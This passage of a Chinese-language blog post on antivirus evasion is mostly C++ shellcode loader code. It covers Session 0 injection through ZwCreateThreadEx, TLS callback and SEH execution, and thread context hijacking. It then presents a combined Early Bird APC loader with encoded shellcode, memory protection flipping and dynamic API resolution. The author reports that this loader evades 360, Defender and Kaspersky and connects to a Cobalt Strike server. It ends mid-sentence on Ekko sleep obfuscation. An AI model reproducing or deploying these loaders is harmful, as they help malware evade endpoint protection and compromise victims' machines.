class="comment">//Mapping Injection + Early Bird</span></span><br></pre></td></tr></table></figure><br>可以和其他手段组合，比如 Early Bird 来达到强规避的效果<p></p><p><em><strong>Bypass Session 0 Injection (系统进程注入绕过)</strong></em><br>无法直接向系统进程内注入 shellcode 或者 dll，原因是 R3 的 CreateRemoteThread 在 R0 中的函数原型 ZwCreateThreadEx 在内部调用时会将第七个参数设为 1 导致会使新创建的线程处于挂起状态，所以我们的恶意 shellcode 无法被执行，只需要将第七个参数置 0 即可绕过。<br>注入流程：<br>1、利用函数原型自定义 ZwCreateThreadEx 函数<br>2、通过系统获取 ntdll.dll 并加载 ZwCreateThreadEx 函数<br>3、申请一块内存空间并将 shellcode 写入<br>4、利用 ZwCreateThreadEx 将 shellcode 注入到系统进程中，将第七个参数置 0</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">     <span class="comment">//char DllPath[] = &quot;C:\\Users\\Black Sheep\\source\\repos\\sesion0\\x64\\Debug\\TestDll.dll&quot;;</span></span><br><span class="line">      <span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;   <span class="comment">//shellcode</span></span><br><span class="line">     HANDLE hRemoteThread;</span><br><span class="line">    HANDLE hNtModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class="built_in">GetProcAddress</span>(hNtModule, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">1516</span>(系统进程pid));</span><br><span class="line">    LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">     <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">       <span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">          <span class="built_in">FreeLibrary</span>(hNtModule);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><em><strong>TLS Code Execute (TLS 代码执行)</strong></em><br>线程局部存储（Thread Local Storage，TLS）用来将数据与一个正在执行的指定线程关联起来，其提供了回调函数因此可以利用该函数达到执行 shellcode 的效果，主要编写的是 Reason 其规定和 dll 调用时一样<strong> DLL_PROCESS_ATTACH</strong></p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;  <span class="comment">//shellcode</span></span><br><span class="line"></span><br><span class="line">VOID NTAPI <span class="built_in">TlsCallBack</span>(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class="line"><span class="comment">//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//写执行函数，也可以利用其他手段进行shellcode注入</span></span><br><span class="line">        ((<span class="built_in">void</span>(WINAPI*)(<span class="type">void</span>)) &amp; shellcode)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="comment">//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识</span></span><br><span class="line"><span class="comment">//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，</span></span><br><span class="line"><span class="comment">//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。</span></span><br><span class="line">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg ()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>只是一种执行手段，依然可以配合其他手段组合。<p></p><p><em><strong>SEH Code Execute (SEH 异常处理代码执行)</strong></em><br>SEH (Structured Exception Handling) 结构化异常处理，是 windows 操作系统默认的错误处理机制，通过主动抛出异常然后将恶意代码插入即可触发，可用于反调试。</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ExceptFilter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b = <span class="number">1</span>;</span><br><span class="line">    ((<span class="built_in">void</span>(*NTAPI)(<span class="type">void</span>)) &amp; shellcode)();</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class="comment">//返回出错位置重新执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    _try</span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> c = a / b;  <span class="comment">//只要能触发异常即可</span></span><br><span class="line">    &#125;</span><br><span class="line">    _except(<span class="built_in">ExceptFilter</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>需要主动触发异常，当然可以填充大量代码将触发异常的代码写的很隐蔽，还可以做到反调试的效果，也需要配合其他手段食用。<p></p><p><em><strong>SetContext Hijack Thread (线程上下文环境劫持)</strong></em><br>简单理解就是劫持线程的上下文环境，然后强行将 eip/rip 指向 shellcode 并执行。<br>劫持流程：<br>1、创建一个挂起的合法进程<br>2、将恶意 shellcode 写入该进程<br>3、将 eip/rip 指向该地址<br>4、恢复线程</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">     <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">     <span class="built_in">SuspendThread</span>(pi.hThread);</span><br><span class="line">     LPVOID lpBuffer = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">     <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpBuffer, shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">     </span><br><span class="line">     CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">     <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">     ctx.Rip = (DWORD64)lpBuffer;</span><br><span class="line">     <span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">     <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id="本地测试效果和其他手法演示"><a class="anchor" href="#本地测试效果和其他手法演示">#</a> 本地测试效果和其他手法演示</h4><p>本次编写的恶意样本手法组合为：sgn + Early Bird + RW/RX/NOA 转换 + 自写 Win32API + junkCode 填充 + Sleep (15000)(循环真睡眠) 规避主动内存扫描<br>主要代码：<br></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> fish[<span class="number">307910</span>] = &#123;......&#125;   <span class="comment">//sgn后的shellcode</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* text_path = <span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* CreateP = <span class="string">&quot;CreateProcessA&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* VirPro = <span class="string">&quot;VirtualProtect&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* VirAloc = <span class="string">&quot;VirtualAllocEx&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* WriteMem = <span class="string">&quot;WriteProcessMemory&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* QueAPC = <span class="string">&quot;QueueUserAPC&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pCreateProcessA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* pVirtualAllocEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">	PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pWriteProcessMemory)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pQueueUserAPC)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PAPCFUNC  pfnAPC,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE    hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG_PTR dwData</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GoHere</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">	HMODULE hKernel32 = <span class="built_in">GetModuleHandleW</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	pCreateProcessA MyCreateProcess = (pCreateProcessA)<span class="built_in">GetProcAddress</span>(hKernel32, CreateP);</span><br><span class="line">	pVirtualAllocEx MyVirtualAlloc = (pVirtualAllocEx)<span class="built_in">GetProcAddress</span>(hKernel32, VirAloc);</span><br><span class="line">	pVirtualProtect MyVirProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernel32, VirPro);</span><br><span class="line">	pWriteProcessMemory MyWriteMen = (pWriteProcessMemory)<span class="built_in">GetProcAddress</span>(hKernel32, WriteMem);</span><br><span class="line">	pQueueUserAPC MyQueueAPC = (pQueueUserAPC)<span class="built_in">GetProcAddress</span>(hKernel32, QueAPC);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">MyCreateProcess</span>(text_path, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class="line">	LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">MyVirtualAlloc</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0X400200</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">986</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">777</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">321</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">123</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">15000</span>);</span><br><span class="line">	<span class="built_in">MyWriteMen</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)fish, <span class="built_in">sizeof</span>(fish), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">MyQueueAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//工具生成的junkCode进行填充，太长了就不写了</span></span><br></pre></td></tr></table></figure><br>编译完后还可以进一步操作，比如替换 ico 图标，添加伪签名等等。这里我只进行图标的替换测试了 360 (核晶模式)、windowDefinder (个人版、企业版、专业版)、卡巴斯基 (免费版)，其中除了 wdf 专业版无法上线之外其他都能做到无感上线，并且可以直接执行 shell 命令 (当然这里我用的是 cs4.9 并且配置了 C2profile 有一定的流量规避效果)。<p></p><p><strong>360 核晶</strong>：<img data-src="https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnl0tgyj31c00u0gs7.jpg" alt=""><br><strong>wdf (真实环境远程上线 ==&gt; 执行 screenshot)</strong>：<img data-src="https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqr5hiihj316c0pi7an.jpg" alt=""><br><strong>卡巴斯基</strong>：<img data-src="https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnosm7hj31u70u0dqa.jpg" alt=""><br><strong>360 杀毒 + 360 核晶会报警告提示</strong></p><h5 id="ekko睡眠混淆技术演示"><a class="anchor" href="#ekko睡眠混淆技术演示">#</a> Ekko 睡眠混淆技术演示：</h5><p>该项目也是 havoC2 的作者的，已经集成在了 havoc 上，在这我们单独把这个项目运行看看，将 github 上的项目拉取到本地即可，编译器用的是 visual studio2022。其混淆原理简单来说就是在一个周期内睡眠结束后的几十毫秒内将内存中代码段进行异或恢复到正常功能代码，并同时恢复 RX 属性。<br>我们需要关注的代码段就在 Ekko.c 中，这里我们单独提炼出来：<br></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ImageBase = <span class="built_in">GetModuleHandleA</span>(<span class="literal">NULL</span>);     <span class="comment">//获取当前进程基址</span></span><br><span class="line"><span class="comment">//获取该本进程内存镜像大小</span></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">DWORD e_lfanew = dosHeader-&gt;e_lfanew;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)ImageBase + e_lfanew);</span><br><span class="line">ImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ImageSize = 0x0005e6b4;</span></span><br></pre></td></tr></table></figure><br>这里获取内存镜像大小的代码我做了修改，原项目的代码在我本地运行时获取到的大小始终为 